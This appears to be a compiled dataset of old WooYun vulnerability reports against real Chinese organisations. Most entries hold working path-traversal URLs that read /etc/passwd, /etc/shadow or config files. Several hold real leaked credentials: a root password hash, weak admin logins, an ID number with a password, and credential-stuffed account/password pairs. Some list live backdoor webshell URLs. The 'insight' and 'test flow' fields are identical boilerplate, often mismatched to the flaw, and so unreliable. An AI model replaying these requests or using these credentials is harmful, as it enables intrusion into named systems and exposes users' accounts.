**详情**: [root@localhost ~]# curl http://c.miaozhen.atm.youku.com/../../../../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:

**POC**: [root@localhost ~]# curl http://c.miaozhen.atm.youku.com/../../../../../../../../../../../../../etc/shadowroot:$1$whscGapK$AKLLOuUAfL3uEO5w7Krju0:16380:0:99999:7:::bin:*:16214:0:99999:7:::daemon:*:16214:0:99999:7:::adm:*:16214:0:99999:7:::lp:*:16214:0:99999:7:::sync:*:16214:0:99999:7:::shutdown:*:16

**绕过**: 直接利用

**修复**: 修改配置
---

---
### [wooyun-2014-066735] ZXV10 W812N路由设置文件未授权访问下载
**厂商**: 中兴通讯股份有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 日志文件 http://地址/manager_log_conf_t.gch点击“下载日志”即可下载日志用户配置文件下载 http://地址/manager_dev_config_t.gch设备配置文件下载 http://地址/manager_dev_defcfg_t.gch案例： http://58.255.211.141/manager_dev_defcfg_t.gch

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 添加权限
---

---
### [wooyun-2014-065637] 普通高校面向港澳台招生信息网任意文件读取
**厂商**: 学信网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.gatzs.com.cn//gatyz/fjms/layouts/utf8Layout.jsp?location=../../WEB-INF/web.xml%3f%2500.jpg/WEB-INF/applicationContext-security.xml/WEB-INF/web.xml/WEB-INF/structs-config.xml/WEB-INF/structs-yzadmin.xml/WEB-INF/tiles-defs.xml/WEB-INF/jboss-web.xml

**POC**: 自己去看

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-07405] 卫生部某站点任意文件下载
**厂商**: 卫生部 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://www.12320.gov.cn/manage/download.jsp?filepath=fujian/1295424820703.pdf其中文件下载路径参数filepath没有对路径进行必要的限制

**POC**: http://www.12320.gov.cn/manage/download.jsp?filepath=/manage/download.jsphttp://www.12320.gov.cn/manage/download.jsp?filepath=index.jsp.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2014-061118] 某市社保局网站任意文件下载漏洞
**厂商**: 某市社保局网站 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: downloadModel.sy  没有对用户输入参数进行过滤http://113.106.216.242:7001/hznt/sys/downloadModel.sy?fileName=/../../../../../../../../../../../../etc/passwordhttp://113.106.216.242:7001/hznt/sys/downloadModel.sy?fileName=/../../../../../../../../../../../../etc/shadow

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对用户输入进行严格过滤
---

---
### [wooyun-2014-086322] Pispower云平台存在任意文件读取漏洞
**厂商**: Pispower云平台 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 在服务器上将该目录的权限修改，严格控制。
---

---
### [wooyun-2012-08406] 福建省国土资源厅任意文件下载漏洞
**厂商**: 福建省国土资源厅 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 自己过滤吧，求证书

**绕过**: 直接利用

**修复**: 过滤下载文件名以及路径，对下载文件进行控制
---

---
### [wooyun-2015-0158140]  中国环境监测总站任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标地址http://**.**.**.**/构造下载url  http://**.**.**.**/news/downLoad.jsp?filePath=../../../../../../../../../../etc/passwd%00.pdf这里返回信息要用抓包才可以看见由图可以看见已经下载了/etc/passwd 文件在来一个证明 查看历史命令

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 严格控制下载
---

---
### [wooyun-2013-036088] 湖北档案信息网任意文件下载
**厂商**: 湖北档案信息网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hbda.gov.cn/news.do?method=downloadFile&fileName=../../../WEB-INF/web.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤参数！
---

---
### [wooyun-2013-026377] 常柴股份有限公司某站任意文件下载
**厂商**: 常柴股份有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://61.132.94.6/ioa/book/目录遍历，导致数据库下载

**POC**: 后台因此沦陷

**绕过**: 直接利用

**修复**: 限制对此目录的访问
---

---
### [wooyun-2014-061469] 搜狐某站目录遍历及功能越权漏洞
**厂商**: 搜狐 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://dev.home.sohu.com/common/  目录存在遍历。站点上有大量管理系统。http://dev.home.sohu.com/common/400/  存在越权访问，普通用户可查看数据

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-058972] 刷QQ群分享 文件下载排名 引小伙伴下载指定文件
**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Q群分享，除了文件名称外，成员多会参照下载次数多少，如果拥有一个惊人是下载次数，将会更吸引更多成员下载，首先，登陆群空间http://qun.qzone.qq.com/group#!/1150195/share找到需要处理的文件，开启BurpSuite监听，当鼠标指向下载图标时，拦截请求GET /cgi-bin/group_share_get_downurl?uin=21150195&groupid=21150195&pa=%2F102%2F2ad2a78b-78c2-4568-8c03-55091382432e&r=0.4475841715466231&charset=utf-8&g_tk=1237590203 HTTP/1.1Host: qun.qzone.qq.comProxy-Connection: keep-aliveUser-Agent: Mozilla/5.0 (Window

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 小白无知，只求邀请码
---

---
### [wooyun-2013-037231] 某政府OA网站存在弱口令漏洞
**厂商**: 政府 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.lzhc.gov.cn:8082/general/adminadminadmin后台弱口令 浏览图片哪里存在D盘任意服务器文件下载http://www.lzhc.gov.cn:8082/mysql/index.phpphpmyadmin直接绕过 root权限可以直接执行任何sql命令。

**POC**: http://www.lzhc.gov.cn:8082/general/adminadminadmin后台弱口令 浏览图片哪里存在D盘任意服务器文件下载http://www.lzhc.gov.cn:8082/mysql/index.phpphpmyadmin直接绕过 root权限可以直接执行任何sql命令。

**绕过**: 过滤绕过

**修复**: 你懂得
---

---
### [wooyun-2013-044812] 惠州市人民政府任意文件下载漏洞
**厂商**: 惠州市人民政府 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 惠州市政府网站：http://www.huizhou.gov.cnhttp://www.huizhou.gov.cn/download.shtml?file=../../../../../../etc/passwdpasswd文件可下载至本地。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2015-0136944] 金钱柜p2p系统某处设计缺陷导致大面积注入(demo成功)
**厂商**: 山东金钱柜网络科技有限公司 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到/core/upload.class.phpfunction upfiles($data = array()){global $mysql;$error = "";$file = $data['file'];$dateFile = date("Y-m",time());$this->setData($data);$newDir = ROOT_PATH.$this->file_dir;$count = $num = 0;$error_msg = array();$err_var = array("-2"=>"文件不存在","-3"=>"图片类型不正确","-4"=>"不是图片类型","-5"=>"上传图片过大");$_result = array();foreach($_FILES[$file]['name'] as $i =>$value){if ($value!=""){$count

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 转义一下
---

---
### [wooyun-2012-013720] j2ee分层架构安全（注册乌云1周年庆祝集锦） --  金山词霸
**厂商**: 金山软件集团 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://xiaoshuo.iciba.com/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2012-010335] 酷6网分站数据库账号信息泄露+任意文件读取
**厂商**: 酷6网 | **年份**: 2012 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://hb.ku6.com/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036476] 173CMS程序存在任意目录遍历漏洞
**厂商**: 173cms.com | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试版本：173CMS_V1.2.5_UTF-8网上下了一套程序，准备进行测试。当准备反编译看看代码的时候，蛋疼的发现，IL有保护什么的。想了想的招 终于可以反编译出来了。悲剧有出现了。坑爹，混淆没办法，这不是人看的，随便看了看，最后来点安慰奖吧。目录浏览：POST http://192.168.1.106/Admin/action.ashx HTTP/1.1Host: 192.168.1.106User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0 Paros/3.2.13Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Content-Type: application/x-www-form-url

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加个权限验证，过滤..
---

---
### [wooyun-2015-0119256] 中国移动和游戏接入平台又一处任意文件读取
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 入口：登录移动PRM后在“合作管理”的合作项目中点击“变更”。上传附件后，查看其下载链接GET /bme/content/DownLoadServlet?fileURL=%2Fetc%2Fpasswd&fileName=1&type=opftp HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*Referer: http://admin.cmgame.com:8168/bme/customCp/copModCourseprm.action?isFlush=true&goPage=basicprm&isChange=1&usertype=cp&objectId=101957&hideT

**POC**: 如上。

**绕过**: 直接利用

**修复**: ._.
---

---
### [wooyun-2013-023328] 临沂市工商行政管理局 后台弱口令+各种目录遍历+N多敏感信息 可导致服务器沦陷
**厂商**: 临沂市工商行政管理局 | **年份**: 2013 | **类型**: 服务弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 编辑器已经有了，具体杂搞百度都有。各种遍历啊~~~  信息很多啊~~

**POC**: 来张完整的大图~~~

**绕过**: 直接利用

**修复**: 做一次安全检查吧。
---

---
### [wooyun-2015-0137493] 中国国旅b2b网站三处任意文件下载
**厂商**: 中国国旅 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: RT

**POC**: 将参数修改，发现可以跳脱网站路径，可下载系统上的文件，如：/etc/passwd和程序原始码。http://b2b.cits.com.cn/citsonlineWeb/outbound/b2b/openFile.jsp?fileLink=../../../etc/passwdhttp://b2b.cits.com.cn/citsonlineWeb/online/messageBBS/openFile.jsp?&fileName=../../../../etc/passwdhttp://b2b.cits.com.cn/citsonlineWeb/visa/b2c/openFile.jsp?req

**绕过**: 直接利用

**修复**: 限制路径限制扩展名
---

---
### [wooyun-2014-089016] PHPAPP注入第九枚（insert无视过滤）
**厂商**: PHPAPP | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com/member.php?action=1&app=43&cid=2&rid=-1, 存在漏洞的文件在/phpapp/apps/refund/member_phpapp.php审核大大，这里说明一下，前面提交了一个漏洞（http://wooyun.org/bugs/wooyun-2014-088699），和本漏洞存在于同一个文件，但是1、URL不同；2、对参数rid的要求不同：一个是要大于0，一个要求小于0；3、SQL语句不同：一个是Update注入，一个是Insert注入；4：注入参数不同：一个是seller

**POC**: 见 详细说明

**绕过**: 过滤绕过

**修复**: 完善dataTypeConvert方法
---

---
### [wooyun-2014-060529] 大顺物流(北京)任意文件下载
**厂商**: 大顺物流 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 输入地址 http://www.daysunlogistics.com.cn/data/myflynt/download.php?filename=../../../data/myflynt/download.php回应 Cannot be used for php files! ，如图

**POC**: 输入地址 http://www.daysunlogistics.com.cn/data/myflynt/download.php?filename=../../../data/myflynt/download.php%00可下载漏洞程序源碼 download.php

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-084834] 百度前端某开源应用任意目录遍历/文件下载
**厂商**: 百度 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意目录遍历http://ufinder.duapp.com/lib/ufinder/server/ufinder.php?cmd=ls&target=/../../../../../../../../../../../任意文件下载http://ufinder.duapp.com/lib/ufinder/server/ufinder.php?cmd=download&target=/../../../../../../../../../../../../../etc/passwd

**POC**: 好开心，既可以列目录，又能看文件：

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-099760] 上海证券交易所又一IE插件可导致用户本地文件泄漏
**厂商**: 上海证券交易所 | **年份**: 2015 | **类型**: 用户敏感数据泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户敏感数据泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户敏感数据泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海证券交易所IE插件可导致用户本地文件泄漏PkiCom5 IE控件提供的接口可读取用户计算机硬盘上的文件，如果一个文件可以以读写形式打开，并且大小不较大（测试中发现980K字节以内可顺利读取显示），则可被该函数读取，从而实现目录遍历。

**POC**: http://biz.sse.com.cn/sseportal/ps/zhs/ca/ca_activex_control_check.jsp可在上面的页面中下载安装PkiCom5控件。当把测试代码放到远程服务器的html中，检测两个文件路径c:/WINDOWS/notepad.exe和c:/WINDOWS/notepad1.exe，下图为测试结果显示确定c:/WINDOWS/notepad.exe存在，

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0164279] 苏宁cpss系统任意文件下载漏洞
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 根据文件一个个找下去吧，内容不少，到最后源码泄露，数据库泄露，各种配置文件泄露不是问题，部分敏感信息如下图

**POC**: http://cpss.suning.com/slavefile.jsp?filePath=/opt/jboss/standalone/configuration/standalone.xml

**绕过**: 直接利用

**修复**: 把你们的流氓SRC关了得了、、、
---

---
### [wooyun-2015-0137348] 酷我vip某接口设计不当可撞库用户（大量账号证明）
**厂商**: 酷我音乐 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://vip.kuwo.cn/vip/jsp/login.jsp?status=4这个接口是酷我vip的一个登陆接口，登陆位置未做登陆验证机制抓包之后查看用户名和密码又是明文传输之后测试撞库用户，判断应该是可以成功撞库的：大量撞库成功账号证明：tyty91	84662256	1719xiaoj8bai	521880227	1719haibo72	1294468	1719huhuan1742	7612746	1719qiongyusg	wangyufeng	1719xz6926249	cn95588021	1719q6235053	q6235053	1719tewytyl	213288848	1719yhlinjun	276951439	1719dou454	86530787	1719zod1221	8530157	1719nbdbx	50057188	1719liux7813	37

**POC**: http://vip.kuwo.cn/vip/jsp/login.jsp?status=4这个接口是酷我vip的一个登陆接口，登陆位置未做登陆验证机制抓包之后查看用户名和密码又是明文传输之后测试撞库用户，判断应该是可以成功撞库的：大量撞库成功账号证明：tyty91	84662256	1719xiaoj8bai	521880227	1719haibo72	1294468	1719huhuan1742	7612746	1719qiongyusg	wangyufeng	1719xz6926249	cn95588021	1719q6235053	q6235053	1719tewytyl	2132888

**绕过**: 直接利用

**修复**: 加上验证码
---

---
### [wooyun-2015-0160343] IMBATV压缩文件下载包含数据库信息
**厂商**: imbatv.cn | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://imbatv.cn/uploads/uploads.zip下载文件。。。uploads里面为什么要放sql文件？？？

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删了吧
---

---
### [wooyun-2015-0112172] 邮政某薪酬查询系统目录遍历
**厂商**: 中国邮政集团公司信息技术局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆地址：222.243.207.18:8082/账号：433001196606040215密码：991031遍历目录：222.243.207.18:8082/admin/用户信息明文保存，密码MD5简单加密

**POC**: 目录遍历SQL敏感数据登陆成功

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-082350] 联想开放平台任意文件下载passwd/shadow都可以
**厂商**: 联想 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://open.lenovo.com/developer/servlet/FileDownloadServlet?fileName=../../../../../../../../../../../../../sbin/../etc/./rc.d/../rc.d/.././shadow

**POC**: http://open.lenovo.com/developer/servlet/FileDownloadServlet?fileName=../../../../../../../../../../../../../sbin/../etc/./rc.d/../rc.d/.././passwd

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-08279] 移动梦网遍历目录，任意文件下载！
**厂商**: 中国移动 | **年份**: 2012 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 移动梦网遍历目录，任意文件下载！www.monternet.com

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-041743] 中国联通某分站文件遍历漏洞敏感文件下载
**厂商**: 中国联通 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mms.wo.com.cn/DownLoadFile?filePath=/../../../etc/passwdhttp://mms.wo.com.cn/DownLoadFile?filePath=/../../../etc/shadow

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-062859] 网宿科技某站点任意文件读取导致敏感信息泄漏+某非重要备份文件泄露
**厂商**: 网宿科技 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 备份文件：http://ecb.gz.chinanetcenter.com/obs-helper/nav_intro.jsp.bak任意文件读取：http://ecb.gz.chinanetcenter.com/obs/www/getDocument.do?doc=WEB-INF/web.xml&locale=zh_CN

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-025059] 中国政法大学国际法学研究网后台存在弱口令
**厂商**: 中国政法大学 | **年份**: 2013 | **类型**: 基础设施弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 基础设施弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别基础设施弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台地址：http://www.cuplfil.com/systemmanage/login.asp弱口令账号：guojifa密码：guojifa

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 改密码
---

---
### [wooyun-2015-0115477] 得仕通任意文件下载漏洞
**厂商**: 得仕通 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: url:https://www.dayspay.com.cn/download.jsp?file=../../../../../../../../../../../../etc/passwd

**POC**: url:https://www.dayspay.com.cn/download.jsp?file=../../../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 你们应该比我懂的更多哈~
---

---
### [wooyun-2014-085604] 多个政府和教育网站被入侵留下后门可以成功爆破进入
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.lndca.gov.cn/plugins/1/AspxSpy.aspx  后门地址http://xtfc.gov.cn/SiteServer/chdhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Fuck.aspx   后门地址http://ajj.zhengzhou.gov.cn/ajj/index.jsp        后门地址http://www.lndca.gov.cn  这个网站还存在遍历http://wlxt.whut.edu.cn/new/%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%A4%B9/1.aspx  后门地址http://arts.hkbu.edu.hk/~upload/222.aspx  后门地址http://jpkc.whmc.

**POC**: 由于后门没有做验证限制，使用强大的字典弄个自动化软件，就可以爆破成功， 测试了其中某网站是爆破成功的进一步测试发现shell权限很大，可以调用CMD命令进行提权，服务器补丁也没有打，还可以进一步深入，做安全测试，适可而止，拒绝水表。

**绕过**: 直接利用

**修复**: 你们比我更懂
---

---
### [wooyun-2015-0113638] 软航NTKO 附件管理IE控件漏洞可导致任意代码执行(涉及IT行业公司、政府、金融、研究所等)
**厂商**: ntko.com | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 软航NTKO 附件管理IE控件的AddLocalFile函数存在安全漏洞，可导致EIP被控制，从而执行任意代码控制IE浏览器用户的系统

**POC**: 下面的视频文件演示了此漏洞，环境是win7+IE11，可以看到漏洞在IE浏览含有恶意代码的页面时直接就被触发了，不需任何交互，EIP被指向00440044（unicode“DD”字符串）http://1drv.ms/1E1LtEm

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0157356] oppo某系统文件下载漏洞
**厂商**: 广东欧珀移动通讯有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://oim.oppo.com/oim/downloadserver?fid=/&act=2&isAbleZip=0&fna=../../../../../etc/passwd&a=1

**POC**: http://oim.oppo.com/oim/downloadserver?fid=/&act=2&isAbleZip=0&fna=../../../../../etc/passwd&a=1

**绕过**: 直接利用

**修复**: 1.首选删除downloadserver2.过滤参数吧！
---

---
### [wooyun-2015-0126246] 川航某系统目录遍历漏洞可导致各种资料漫天飞
**厂商**: 四川航空 | **年份**: 2015 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: fly1.scal.com.cn:8080看图不说话  说多了 等会放学就把我打了以下这张图  表达了 川航 有多少架飞机   和飞机 内具体什么 装饰累死

**POC**: fly1.scal.com.cn:8080看图不说话  说多了 等会放学就把我打了以下这张图  表达了 川航 有多少架飞机   和飞机 内具体什么 装饰

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2015-0103576] 搜房网某系统弱口令&任意文件下载
**厂商**: 搜房网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 邮箱弱口令 cuina@fang.com  123456a登录CRM客户系统任意文件下载kehu.esf.fang.com:5658/esfcrmsite/model/SysManage/Document/DownLoadDoc.aspx?DocUrl=../web.config

**POC**: 邮箱弱口令 cuina@fang.com  123456a登录CRM客户系统任意文件下载kehu.esf.fang.com:5658/esfcrmsite/model/SysManage/Document/DownLoadDoc.aspx?DocUrl=../web.config

**绕过**: 直接利用

**修复**: 修改密码。验证用户的输入。
---

---
